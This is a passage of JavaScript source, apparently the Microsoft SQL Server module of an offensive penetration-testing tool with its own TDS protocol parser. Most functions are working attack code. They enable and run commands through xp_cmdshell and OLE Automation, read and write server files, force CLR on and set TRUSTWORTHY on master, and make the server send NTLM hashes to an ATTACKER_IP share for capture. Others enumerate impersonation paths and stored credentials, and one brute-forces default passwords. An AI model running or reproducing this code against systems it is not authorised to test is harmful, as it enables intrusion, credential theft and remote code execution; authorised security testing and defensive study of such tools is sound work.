          const dateStr = new Date((days - 719162) * 86400000).toISOString().slice(0, 10);
          if (type === 0x2a) return `${dateStr} ${timeStr}`;
          // DATETIMEOFFSET: append offset like "+02:00".
          const off = new DataView(resp.buffer, resp.byteOffset + pos).getInt16(0, true); pos += 2;
          const sign = off < 0 ? '-' : '+', abs = Math.abs(off);
          return `${dateStr} ${timeStr} ${sign}${String(Math.floor(abs / 60)).padStart(2, '0')}:${String(abs % 60).padStart(2, '0')}`;
        }
        if (type === 0x24 /*GUID*/) {
          const g = resp.subarray(pos, pos + len); pos += len;
          const h = (i) => g[i].toString(16).padStart(2, '0');
          return `${h(3)}${h(2)}${h(1)}${h(0)}-${h(5)}${h(4)}-${h(7)}${h(6)}-${h(8)}${h(9)}-${h(10)}${h(11)}${h(12)}${h(13)}${h(14)}${h(15)}`;
        }
        return `<${type.toString(16)}:${len}B>`;
      }
      // USHORTLEN — 2-byte length field; 0xFFFF = NULL.
      if ([0xaf, 0xa7, 0xef, 0xe7, 0xad, 0xa5].includes(type)) {
        const len = dv.getUint16(pos, true); pos += 2;
        if (len === 0xffff) return null;
        const bytes = resp.subarray(pos, pos + len); pos += len;
        if (type === 0xef || type === 0xe7) {
          // NVARCHAR / NCHAR — UTF-16LE.
          let s = '';
          for (let i = 0; i + 1 < len; i += 2) s += String.fromCharCode(bytes[i] | (bytes[i + 1] << 8));
          return s;
        }
        if (type === 0xaf || type === 0xa7) {
          // VARCHAR / CHAR — use collation but for now assume Windows-1252 / ASCII.
          let s = ''; for (const b of bytes) s += String.fromCharCode(b); return s;
        }
        return Array.from(bytes).map((b) => b.toString(16).padStart(2, '0')).join('');
      }
      // LONGLEN — 4-byte length (or PLP if -1). Skip properly.
      if ([0x22, 0x23, 0x63].includes(type)) {
        // TextPointer BVARCHAR + Timestamp 8B + Data u32 len + bytes
        const ptrLen = resp[pos++]; pos += ptrLen; pos += 8;
        const len = dv.getUint32(pos, true); pos += 4;
        if (len === 0xffffffff) return null;
        const bytes = resp.subarray(pos, pos + len); pos += len;
        if (type === 0x63 /*NTEXT*/) {
          let s = ''; for (let i = 0; i + 1 < len; i += 2) s += String.fromCharCode(bytes[i] | (bytes[i + 1] << 8)); return s;
        }
        if (type === 0x23 /*TEXT*/) {
          let s = ''; for (const b of bytes) s += String.fromCharCode(b); return s;
        }
        return `<binary ${len}B>`;
      }
      throw new Error(`can't decode TDS value of type 0x${type.toString(16)}`);
    };

    try {
      while (pos < resp.length) {
        const token = resp[pos++];
        switch (token) {
          case 0x81: { // COLMETADATA
            const colCount = dv.getUint16(pos, true); pos += 2;
            if (colCount === 0xffff) break; // no columns
            columns.length = 0;
            for (let i = 0; i < colCount; i++) {
              pos += 4;                     // UserType u32
              pos += 2;                     // Flags u16
              const t = readTypeInfo();
              const nameLen = resp[pos++];
              let name = '';
              for (let j = 0; j < nameLen; j++) name += String.fromCharCode(dv.getUint16(pos + j * 2, true));
              pos += nameLen * 2;
              columns.push({ name, type: t.type, sub: t.sub, scale: t.scale, precision: t.precision });
            }
            break;
          }
          case 0xd1: { // ROW
            const row = [];
            for (const col of columns) row.push(readValue(col));
            rows.push(row);
            break;
          }
          case 0xd2: { // NBCROW (nullable bitmap row) — one bit per column, 0=present, 1=NULL.
            const bmLen = Math.ceil(columns.length / 8);
            const bm = resp.subarray(pos, pos + bmLen); pos += bmLen;
            const row = [];
            for (let i = 0; i < columns.length; i++) {
              if (bm[i >> 3] & (1 << (i & 7))) { row.push(null); }
              else row.push(readValue(columns[i]));
            }
            rows.push(row);
            break;
          }
          case 0xaa: { // ERROR
            const len = dv.getUint16(pos, true); pos += 2;
            const b = resp.subarray(pos, pos + len); pos += len;
            const bdv = new DataView(b.buffer, b.byteOffset, b.byteLength);
            const number = bdv.getUint32(0, true);
            const msgLen = bdv.getUint16(6, true);
            let msg = '';
            for (let j = 0; j < msgLen; j++) msg += String.fromCharCode(bdv.getUint16(8 + j * 2, true));
            errors.push(`[${number}] ${msg}`);
            break;
          }
          case 0xab: { // INFO — same layout as ERROR
            const len = dv.getUint16(pos, true); pos += 2;
            const b = resp.subarray(pos, pos + len); pos += len;
            const bdv = new DataView(b.buffer, b.byteOffset, b.byteLength);
            const msgLen = bdv.getUint16(6, true);
            let msg = '';
            for (let j = 0; j < msgLen; j++) msg += String.fromCharCode(bdv.getUint16(8 + j * 2, true));
            info.push(msg);
            break;
          }
          case 0xe3: { // ENVCHANGE
            const len = dv.getUint16(pos, true); pos += 2 + len;
            break;
          }
          case 0xa9: { // ORDER
            const len = dv.getUint16(pos, true); pos += 2 + len;
            break;
          }
          case 0x79: { // RETURNSTATUS
            pos += 4; break;
          }
          case 0xfd: case 0xfe: case 0xff: { // DONE / DONEPROC / DONEINPROC
            pos += 12; break;
          }
          default: {
            // Unknown token — try to skip with u16 length prefix (works for
            // most token classes). Otherwise stop.
            try { const len = dv.getUint16(pos, true); pos += 2 + len; }
            catch { pos = resp.length; }
          }
        }
      }
    } catch (e) {
      // Parser error — leave what we have and surface it.
      errors.push(`parser: ${e.message}`);
    }
    return { columns: columns.map((c) => c.name), rows, info, errors };
  }
}

async function withMssql(host, creds, opts, fn) {
  const client = new TdsClient(host, opts.port || 1433);
  try {
    await client.connect();
    await client.prelogin();
    if (opts.auth === 'kerberos' && creds.domain) {
      const ntHash = parseNtHash(creds.hash);
      await client.loginKerberos(creds.user, creds.domain, creds.password, opts.database || 'master', ntHash, opts.kdc || host);
    } else if (creds.domain && (creds.password || creds.hash)) {
      const ntHash = parseNtHash(creds.hash);
      await client.loginNtlm(creds.user, creds.domain, creds.password, opts.database || 'master', ntHash, !!(opts && opts.localAuth));
    } else {
      await client.login(creds.user, creds.password, opts.database || 'master');
    }
    return await fn(client);
  } finally {
    try { await client.close(); } catch {}
  }
}

export async function mssqlAuth(host, creds, opts, log) {
  try {
    await withMssql(host, creds, opts, async () => {});
    const authType = opts.auth === 'kerberos' ? 'Kerberos' : creds.domain ? 'NTLM' : 'SQL';
    log('ok', 'mssql', host, `${creds.domain}\\${creds.user}`, `login OK (${authType})`);
    return true;
  } catch (e) {
    log('err', 'mssql', host, `${creds.domain}\\${creds.user}`, e.message);
    return false;
  }
}

export async function mssqlExec(host, creds, opts, log, command) {
  if (!command) { log('err', 'mssql', host, 'exec', 'no command specified'); return null; }
  try {
    return await withMssql(host, creds, opts, async (client) => {
      await client.query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
      await client.query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
      const result = await client.query(`EXEC xp_cmdshell '${command.replace(/'/g, "''")}'`);
      for (const row of result.rows) {
        if (row[0] && row[0] !== 'NULL') log('ok', 'mssql', host, '', row[0]);
      }
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'exec', e.message);
    return null;
  }
}

export async function mssqlQuery(host, creds, opts, log, sql) {
  if (!sql) { log('err', 'mssql', host, 'query', 'no SQL specified'); return null; }
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query(sql);
      for (const m of result.info || []) log('info', 'mssql', host, '', m);
      for (const e of result.errors || []) log('err', 'mssql', host, '', e);
      if (result.columns.length) log('ok', 'mssql', host, '', result.columns.join(' | '));
      for (const row of result.rows) log('ok', 'mssql', host, '', row.map((v) => v === null ? '(null)' : String(v)).join(' | '));
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'query', e.message);
    return null;
  }
}

export async function mssqlUsers(host, creds, opts, log) {
  return mssqlQuery(host, creds, opts, log,
    "SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name");
}

export async function mssqlDbs(host, creds, opts, log) {
  return mssqlQuery(host, creds, opts, log, "SELECT name, state_desc FROM sys.databases ORDER BY name");
}

export async function mssqlPrivesc(host, creds, opts, log) {
  // Two things worth flagging as privilege-escalation paths on MSSQL:
  //   * sysadmin roster (IS_SRVROLEMEMBER('sysadmin', principal) = 1)
  //   * every principal we can IMPERSONATE (server-level and db-level)
  // Union both so the operator sees one merged table.
  return mssqlQuery(host, creds, opts, log,
    "SELECT p.name AS principal, p.type_desc, 'sysadmin' AS finding FROM sys.server_principals p " +
    "WHERE p.type IN ('S','U','G') AND IS_SRVROLEMEMBER('sysadmin', p.name) = 1 " +
    "UNION ALL " +
    "SELECT p.name AS principal, p.type_desc, 'IMPERSONATE ' + gp.name AS finding " +
    "FROM sys.server_permissions perm " +
    "JOIN sys.server_principals p ON perm.grantee_principal_id = p.principal_id " +
    "JOIN sys.server_principals gp ON perm.grantor_principal_id = gp.principal_id " +
    "WHERE perm.permission_name = 'IMPERSONATE' AND perm.state IN ('G','W')");
}

export async function mssqlGet(host, creds, opts, log, path) {
  if (!path) { log('err', 'mssql', host, 'get', 'no file path specified'); return null; }
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const escaped = path.replace(/'/g, "''");
      const result = await client.query(`SELECT BulkColumn FROM OPENROWSET(BULK '${escaped}', SINGLE_CLOB) AS x`);
      for (const row of result.rows) {
        if (row[0]) log('ok', 'mssql', host, path, row[0].slice(0, 200) + (row[0].length > 200 ? '...' : ''));
      }
      if (!result.rows.length) log('info', 'mssql', host, 'get', 'no data returned');
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'get', e.message);
    return null;
  }
}

export async function mssqlPut(host, creds, opts, log, args) {
  if (!args) { log('err', 'mssql', host, 'put', 'usage: C:\\path\\file content'); return null; }
  const idx = args.indexOf(' ');
  const path = idx > 0 ? args.slice(0, idx) : args;
  const content = idx > 0 ? args.slice(idx + 1) : '';
  try {
    return await withMssql(host, creds, opts, async (client) => {
      await client.query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
      await client.query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
      const escaped = content.replace(/'/g, "''").replace(/&/g, '^&').replace(/\|/g, '^|');
      await client.query(`EXEC xp_cmdshell 'echo ${escaped}> ${path.replace(/'/g, "''")}'`);
      log('ok', 'mssql', host, path, `${content.length} bytes written`);
      return true;
    });
  } catch (e) {
    log('err', 'mssql', host, 'put', e.message);
    return null;
  }
}

export async function mssqlClr(host, creds, opts, log, command) {
  if (!command) { log('err', 'mssql', host, 'clr', 'no command specified'); return null; }
  try {
    return await withMssql(host, creds, opts, async (client) => {
      await client.query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
      await client.query("EXEC sp_configure 'clr enabled', 1; RECONFIGURE;");
      let clrEnabled = false;
      try {
        const r = await client.query("SELECT value FROM sys.configurations WHERE name = 'clr enabled'");
        clrEnabled = r.rows.length > 0 && r.rows[0][0] === '1';
      } catch {}
      if (clrEnabled) {
        log('warn', 'mssql', host, 'clr', 'CLR is ENABLED — .NET assembly execution possible');
      } else {
        log('info', 'mssql', host, 'clr', 'CLR could not be enabled (insufficient privileges)');
      }
      try {
        await client.query("ALTER DATABASE master SET TRUSTWORTHY ON");
        log('warn', 'mssql', host, 'clr', 'TRUSTWORTHY set ON for master — CLR assembly can be loaded');
      } catch {
        log('info', 'mssql', host, 'clr', 'could not set TRUSTWORTHY (need db_owner)');
      }
      return { clrEnabled };
    });
  } catch (e) {
    log('err', 'mssql', host, 'clr', e.message);
    return null;
  }
}

export async function mssqlOle(host, creds, opts, log, command) {
  if (!command) { log('err', 'mssql', host, 'ole', 'no command specified'); return null; }
  try {
    return await withMssql(host, creds, opts, async (client) => {
      await client.query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
      await client.query("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;");
      const escaped = command.replace(/'/g, "''");
      const sql = `DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c ${escaped}'; EXEC sp_OADestroy @o;`;
      await client.query(sql);
      log('ok', 'mssql', host, 'ole', `executed via OLE: ${command}`);
      return true;
    });
  } catch (e) {
    log('err', 'mssql', host, 'ole', e.message);
    return null;
  }
}

export async function mssqlOpenquery(host, creds, opts, log, args) {
  if (!args) { log('err', 'mssql', host, 'openquery', 'usage: LINKED_SERVER "SQL query"'); return null; }
  const idx = args.indexOf(' ');
  const linkedServer = idx > 0 ? args.slice(0, idx) : args;
  const sql = idx > 0 ? args.slice(idx + 1) : 'SELECT @@version';
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const escaped = sql.replace(/'/g, "''");
      const result = await client.query(`SELECT * FROM OPENQUERY([${linkedServer}], '${escaped}')`);
      if (result.columns.length) log('ok', 'mssql', host, `openquery:${linkedServer}`, result.columns.join(' | '));
      for (const row of result.rows) log('ok', 'mssql', host, '', row.join(' | '));
      if (!result.rows.length) log('info', 'mssql', host, 'openquery', 'no rows returned');
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'openquery', e.message);
    return null;
  }
}

export async function mssqlLinks(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query("EXEC sp_linkedservers");
      if (result.columns.length) log('ok', 'mssql', host, 'links', result.columns.join(' | '));
      for (const row of result.rows) log('ok', 'mssql', host, '', row.join(' | '));
      if (!result.rows.length) log('info', 'mssql', host, 'links', 'no linked servers found');
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'links', e.message);
    return null;
  }
}

export async function mssqlStealHash(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'mssql', host, 'steal-hash', 'usage: --steal-hash \\\\ATTACKER_IP\\share');
    return null;
  }
  const uncPath = args.trim();
  try {
    return await withMssql(host, creds, opts, async (client) => {
      log('info', 'mssql', host, 'steal-hash', `triggering UNC auth to ${uncPath}...`);
      try {
        await client.query(`EXEC master.dbo.xp_dirtree '${uncPath}', 1, 1`);
        log('ok', 'mssql', host, 'steal-hash', `xp_dirtree triggered — check responder/ntlmrelayx`);
      } catch {
        try {
          await client.query(`EXEC master.dbo.xp_fileexist '${uncPath}\\test'`);
          log('ok', 'mssql', host, 'steal-hash', `xp_fileexist triggered — check responder/ntlmrelayx`);
        } catch (e2) {
          log('err', 'mssql', host, 'steal-hash', `both xp_dirtree and xp_fileexist failed: ${e2.message}`);
        }
      }
      return true;
    });
  } catch (e) {
    log('err', 'mssql', host, 'steal-hash', e.message);
    return null;
  }
}

export async function mssqlImpersonate(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query(`
        SELECT DISTINCT b.name
        FROM sys.server_permissions a
        INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
        WHERE a.permission_name = 'IMPERSONATE'
      `);
      if (!result.rows.length) {
        log('info', 'mssql', host, 'impersonate', 'no impersonatable logins found');
      }
      for (const row of result.rows) {
        log('ok', 'mssql', host, 'impersonate', `can impersonate: ${row[0]}`);
      }
      const dbResult = await client.query(`
        SELECT DISTINCT b.name
        FROM sys.database_permissions a
        INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
        WHERE a.permission_name = 'IMPERSONATE'
      `);
      for (const row of dbResult.rows) {
        log('ok', 'mssql', host, 'impersonate', `can impersonate (db): ${row[0]}`);
      }
      return true;
    });
  } catch (e) {
    log('err', 'mssql', host, 'impersonate', e.message);
    return null;
  }
}

export async function mssqlWhoami(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const login = await client.query("SELECT SYSTEM_USER");
      const user = await client.query("SELECT USER_NAME()");
      const isAdmin = await client.query("SELECT IS_SRVROLEMEMBER('sysadmin')");
      log('ok', 'mssql', host, 'login', login.rows[0]?.[0] || '?');
      log('ok', 'mssql', host, 'user', user.rows[0]?.[0] || '?');
      log('ok', 'mssql', host, 'sysadmin', isAdmin.rows[0]?.[0] == 1 ? 'YES' : 'NO');
      const svc = await client.query("SELECT service_account FROM sys.dm_server_services WHERE servicename LIKE '%SQL%'");
      for (const row of svc.rows) {
        log('ok', 'mssql', host, 'service-account', row[0]);
      }
      return true;
    });
  } catch (e) {
    log('err', 'mssql', host, 'whoami', e.message);
    return null;
  }
}

export async function mssqlTables(host, creds, opts, log, args) {
  const db = args?.trim() || opts.database || 'master';
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query(`SELECT TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE FROM [${db}].INFORMATION_SCHEMA.TABLES ORDER BY TABLE_SCHEMA, TABLE_NAME`);
      if (result.columns.length) log('ok', 'mssql', host, 'tables', result.columns.join(' | '));
      for (const row of result.rows) log('ok', 'mssql', host, '', row.join(' | '));
      log('ok', 'mssql', host, 'tables', `${result.rows.length} table(s) in ${db}`);
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'tables', e.message);
    return null;
  }
}

export async function mssqlColumns(host, creds, opts, log, args) {
  if (!args?.trim()) { log('err', 'mssql', host, 'columns', 'usage: --columns TABLE'); return null; }
  const table = args.trim();
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query(`SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, IS_NULLABLE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${table}' ORDER BY ORDINAL_POSITION`);
      if (result.columns.length) log('ok', 'mssql', host, table, result.columns.join(' | '));
      for (const row of result.rows) log('ok', 'mssql', host, '', row.join(' | '));
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'columns', e.message);
    return null;
  }
}

export async function mssqlSearch(host, creds, opts, log, args) {
  if (!args?.trim()) { log('err', 'mssql', host, 'search', 'usage: --mssql-search KEYWORD'); return null; }
  const keyword = args.trim();
  try {
    return await withMssql(host, creds, opts, async (client) => {
      log('info', 'mssql', host, 'search', `searching for columns containing "${keyword}"...`);
      const result = await client.query(`
        SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE
        FROM INFORMATION_SCHEMA.COLUMNS
        WHERE COLUMN_NAME LIKE '%${keyword}%'
        ORDER BY TABLE_NAME, COLUMN_NAME
      `);
      for (const row of result.rows) {
        log('ok', 'mssql', host, `${row[0]}.${row[1]}`, `${row[2]} (${row[3]})`);
      }
      log('ok', 'mssql', host, 'search', `${result.rows.length} column(s) matching "${keyword}"`);
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'search', e.message);
    return null;
  }
}

export async function mssqlSysinfo(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const ver = await client.query("SELECT @@VERSION");
      if (ver.rows[0]) log('ok', 'mssql', host, 'version', ver.rows[0][0]?.split('\n')[0]);
      const srv = await client.query("SELECT @@SERVERNAME");
      if (srv.rows[0]) log('ok', 'mssql', host, 'servername', srv.rows[0][0]);
      const edition = await client.query("SELECT SERVERPROPERTY('Edition')");
      if (edition.rows[0]) log('ok', 'mssql', host, 'edition', edition.rows[0][0]);
      const level = await client.query("SELECT SERVERPROPERTY('ProductLevel')");
      if (level.rows[0]) log('ok', 'mssql', host, 'product-level', level.rows[0][0]);
      return true;
    });
  } catch (e) {
    log('err', 'mssql', host, 'sysinfo', e.message);
    return null;
  }
}

export async function mssqlLogins(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query("SELECT name, type_desc, is_disabled, default_database_name FROM sys.server_principals WHERE type NOT IN ('R', 'C') ORDER BY name");
      if (result.columns.length) log('ok', 'mssql', host, 'logins', result.columns.join(' | '));
      for (const row of result.rows) {
        const disabled = row[2] == 1 ? ' [DISABLED]' : '';
        log('ok', 'mssql', host, row[0], `${row[1]}${disabled} — db: ${row[3]}`);
      }
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'logins', e.message);
    return null;
  }
}

export async function mssqlBackups(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query("SELECT database_name, physical_device_name, backup_start_date, backup_finish_date, type FROM msdb.dbo.backupset bs JOIN msdb.dbo.backupmediafamily bmf ON bs.media_set_id = bmf.media_set_id ORDER BY backup_start_date DESC");
      for (const row of result.rows) {
        const type = row[4] === 'D' ? 'FULL' : row[4] === 'I' ? 'DIFF' : row[4] === 'L' ? 'LOG' : row[4];
        log('ok', 'mssql', host, row[0], `${type} — ${row[1]} (${row[2]})`);
      }
      log('ok', 'mssql', host, 'backups', `${result.rows.length} backup(s) found`);
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'backups', e.message);
    return null;
  }
}

export async function mssqlJobs(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query("SELECT j.name, j.enabled, j.description, js.step_name, js.command FROM msdb.dbo.sysjobs j JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id ORDER BY j.name, js.step_id");
      for (const row of result.rows) {
        const enabled = row[1] == 1 ? '' : ' [DISABLED]';
        log('ok', 'mssql', host, row[0], `step: ${row[3]}${enabled} — ${(row[4] || '').substring(0, 120)}`);
      }
      log('ok', 'mssql', host, 'jobs', `${result.rows.length} job step(s)`);
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'jobs', e.message);
    return null;
  }
}

export async function mssqlAudit(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const checks = [
        { name: 'xp_cmdshell', sql: "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'xp_cmdshell'" },
        { name: 'ole_automation', sql: "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'Ole Automation Procedures'" },
        { name: 'clr_enabled', sql: "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr enabled'" },
        { name: 'ad_hoc_queries', sql: "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'Ad Hoc Distributed Queries'" },
        { name: 'trustworthy_dbs', sql: "SELECT name FROM sys.databases WHERE is_trustworthy_on = 1 AND name NOT IN ('msdb')" },
        { name: 'c2_audit', sql: "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'c2 audit mode'" },
        { name: 'cross_db_ownership', sql: "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'cross db ownership chaining'" },
      ];

      for (const check of checks) {
        try {
          const r = await client.query(check.sql);
          if (r.rows.length) {
            for (const row of r.rows) {
              const val = String(row[0]);
              const isRisk = val === '1' || (check.name === 'trustworthy_dbs' && val !== '');
              log(isRisk ? 'warn' : 'ok', 'mssql', host, check.name, val);
            }
          } else {
            log('ok', 'mssql', host, check.name, 'not set');
          }
        } catch {
          log('info', 'mssql', host, check.name, 'access denied');
        }
      }

      const version = await client.query('SELECT @@VERSION');
      if (version.rows.length) {
        const ver = String(version.rows[0][0]).split('\n')[0];
        log('ok', 'mssql', host, 'version', ver);
      }

      return true;
    });
  } catch (e) {
    log('err', 'mssql', host, 'audit', e.message);
    return null;
  }
}

export async function mssqlCredentials(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query("SELECT credential_id, name, credential_identity, create_date FROM sys.credentials");
      for (const row of result.rows) {
        log('ok', 'mssql', host, row[1], `identity: ${row[2]} (created: ${row[3]})`);
      }
      if (!result.rows.length) log('info', 'mssql', host, 'credentials', 'no SQL credentials found');

      const linked = await client.query("SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1");
      for (const row of linked.rows) {
        log('ok', 'mssql', host, row[0], `linked: ${row[1]} via ${row[2]} → ${row[3]}`);
      }

      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'credentials', e.message);
    return null;
  }
}

export async function mssqlTriggers(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query("SELECT t.name AS trigger_name, OBJECT_NAME(t.parent_id) AS table_name, t.is_disabled, m.definition FROM sys.triggers t JOIN sys.sql_modules m ON t.object_id = m.object_id ORDER BY t.name");
      for (const row of result.rows) {
        const disabled = row[2] == 1 ? ' [DISABLED]' : '';
        const def = (String(row[3]) || '').substring(0, 100).replace(/\n/g, ' ');
        log('ok', 'mssql', host, row[0], `on ${row[1]}${disabled} — ${def}`);
      }

      const serverTriggers = await client.query("SELECT name, is_disabled, create_date FROM sys.server_triggers");
      for (const row of serverTriggers.rows) {
        const disabled = row[1] == 1 ? ' [DISABLED]' : '';
        log('warn', 'mssql', host, row[0], `SERVER TRIGGER${disabled} (${row[2]})`);
      }

      log('ok', 'mssql', host, 'triggers', `${result.rows.length} db + ${serverTriggers.rows.length} server trigger(s)`);
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'triggers', e.message);
    return null;
  }
}

export async function mssqlProcs(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query("SELECT ROUTINE_NAME, ROUTINE_TYPE, CREATED, LAST_ALTERED FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_TYPE = 'PROCEDURE' AND SPECIFIC_SCHEMA != 'sys' ORDER BY ROUTINE_NAME");
      for (const row of result.rows) {
        log('ok', 'mssql', host, row[0], `${row[1]} — created: ${row[2]}, modified: ${row[3]}`);
      }
      log('ok', 'mssql', host, 'procs', `${result.rows.length} stored procedure(s)`);

      const dangerous = await client.query("SELECT name, is_auto_executed FROM sys.procedures WHERE is_auto_executed = 1");
      for (const row of dangerous.rows) {
        log('warn', 'mssql', host, row[0], 'AUTO-EXECUTED on startup!');
      }

      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'procs', e.message);
    return null;
  }
}

export async function mssqlDbSize(host, creds, opts, log) {
  try {
    return await withMssql(host, creds, opts, async (client) => {
      const result = await client.query("SELECT db.name, CAST(SUM(mf.size) * 8.0 / 1024 AS DECIMAL(10,2)) AS size_mb, db.state_desc, db.recovery_model_desc FROM sys.databases db JOIN sys.master_files mf ON db.database_id = mf.database_id GROUP BY db.name, db.state_desc, db.recovery_model_desc ORDER BY SUM(mf.size) DESC");
      for (const row of result.rows) {
        log('ok', 'mssql', host, row[0], `${row[1]} MB — ${row[2]} (${row[3]})`);
      }
      return result;
    });
  } catch (e) {
    log('err', 'mssql', host, 'db-size', e.message);
    return null;
  }
}

export async function mssqlBrute(host, creds, opts, log) {
  const users = [creds.user, 'sa', 'admin', 'dba', 'backup', 'test', 'guest'].filter((v, i, a) => a.indexOf(v) === i);
  const passwords = [creds.password, 'sa', 'admin', 'password', 'Password1', 'P@ssw0rd', '123456', creds.user, ''].filter(Boolean);
  let found = 0;
  for (const user of users) {
    for (const pass of passwords) {
      const c = new TdsClient(host, opts.port || 1433);
      try {
        await c.connect();
        await c.prelogin();
        await c.login(user, pass, 'master');
        log('ok', 'mssql', host, `${user}:${pass}`, 'LOGIN SUCCESS');
        found++;
        await c.close();
        break;
      } catch {
        try { await c.close(); } catch {}
      }
    }
  }
  if (found === 0) log('info', 'mssql', host, 'brute', 'no valid credentials found');
  else log('ok', 'mssql', host, 'brute', `${found} valid credential(s) found`);
  return found;
}
